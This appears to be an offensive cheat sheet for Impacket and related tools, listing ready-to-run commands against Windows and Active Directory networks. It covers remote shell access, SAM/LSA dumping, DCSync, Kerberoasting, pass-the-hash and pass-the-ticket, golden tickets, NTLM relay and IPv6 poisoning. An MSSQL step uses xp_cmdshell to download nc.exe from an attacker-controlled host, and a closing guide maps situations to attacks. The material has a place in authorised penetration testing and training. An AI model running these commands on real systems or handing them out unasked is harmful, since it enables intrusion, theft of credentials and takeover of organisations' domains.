Authentication & Shell Access:

bash
# PSExec - RCE via SMB (gives SYSTEM)
impacket-psexec domain/user:password@192.168.1.1
impacket-psexec domain/user@192.168.1.1 -hashes :NTLM_HASH

# SMBExec - RCE via SMB (stealthier than psexec)
impacket-smbexec domain/user:password@192.168.1.1
impacket-smbexec domain/user@192.168.1.1 -hashes :NTLM_HASH

# WMIExec - RCE via WMI (no service creation)
impacket-wmiexec domain/user:password@192.168.1.1
impacket-wmiexec domain/user@192.168.1.1 -hashes :NTLM_HASH

# ATExec - RCE via Task Scheduler
impacket-atexec domain/user:password@192.168.1.1 "whoami"

# DCOMExec - RCE via DCOM
impacket-dcomexec domain/user:password@192.168.1.1

Credential Dumping:

bash
# Dump SAM/LSA remotely
impacket-secretsdump domain/user:password@192.168.1.1

# Dump with hash
impacket-secretsdump domain/user@192.168.1.1 -hashes :NTLM_HASH

# DCSync attack (dump all domain hashes - run against DC)
impacket-secretsdump domain/user:password@192.168.1.1 -just-dc
impacket-secretsdump domain/user:password@192.168.1.1 -just-dc-user administrator

# Dump from local files (offline)
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local

Kerberos Attacks:

bash
# GetTGT - request TGT with password
impacket-getTGT domain/user:password

# GetTGT - request TGT with hash (Pass-the-Hash for Kerberos)
impacket-getTGT domain/user -hashes :NTLM_HASH

# GetST - request service ticket (for delegation attacks)
impacket-getST domain/user:password -spn cifs/target.domain

# GetST - S4U2Proxy (constrained delegation)
impacket-getST domain/user:password -spn cifs/dc01.domain -impersonate administrator

# ASREPRoast - find users without preauth
impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip 192.168.1.1
impacket-GetNPUsers domain/user:password -dc-ip 192.168.1.1 -request

# Kerberoasting - find SPNs and request tickets
impacket-GetUserSPNs domain/user:password -dc-ip 192.168.1.1 -request

# Pass-the-Ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass domain/user@target.domain

AD Enumeration:

bash
# Enumerate domain users
impacket-GetADUsers domain/user:password -all -dc-ip 192.168.1.1

# Enumerate domain controllers
impacket-GetADUsers domain/user:password -dc-ip 192.168.1.1

# LDAP enumeration
impacket-ldapdomaindump domain/user:password -n 192.168.1.1

SMB Operations:

bash
# SMB client - browse shares
impacket-smbclient domain/user:password@192.168.1.1
impacket-smbclient domain/user@192.168.1.1 -hashes :NTLM_HASH

# Inside smbclient
shares          # list shares
use C$          # connect to share
ls              # list files
get file.txt    # download file
put file.txt    # upload file

# SMB server - host files
impacket-smbserver share . -smb2support
impacket-smbserver share . -smb2support -user kali -password kali

MSSQL:

bash
# Connect to MSSQL
impacket-mssqlclient domain/user:password@192.168.1.1
impacket-mssqlclient domain/user@192.168.1.1 -hashes :NTLM_HASH -windows-auth

# Inside mssqlclient
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell "powershell -c iwr http://kali_ip/nc.exe -OutFile C:\Windows\Temp\nc.exe"

Network Attacks:

bash
# NTLM relay attack
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -i  # interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"  # execute command

# Responder (capture hashes)
sudo responder -I tun0 -wrf

# MITM6 (IPv6 poisoning)
mitm6 -d domain.local

Ticket Manipulation:

bash
# Convert ccache to kirbi (for use with Rubeus)
impacket-ticketConverter ticket.ccache ticket.kirbi

# Convert kirbi to ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# Golden ticket attack
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@dc01.domain.local

Common Flags to Remember:

bash
-hashes :NTLM_HASH      # pass the hash (LM:NTLM, use : if no LM)
-k -no-pass             # use Kerberos ticket from KRB5CCNAME
-dc-ip 192.168.1.1      # specify DC IP
-target-ip 192.168.1.1  # specify target IP
-just-dc                # only dump DC secrets
-request                # request ticket (for kerberoasting)
-windows-auth           # use Windows auth (for MSSQL)

Quick Decision Guide:

Have creds + need shell    → psexec/wmiexec/smbexec
Have hash + need shell     → psexec/wmiexec -hashes
On DC + need all hashes    → secretsdump -just-dc
Need to kerberoast        → GetUserSPNs -request
Need ASREPRoast           → GetNPUsers -no-pass
Need to browse shares     → smbclient
Need to relay hashes      → ntlmrelayx + responder
Have ticket               → export KRB5CCNAME + psexec -k
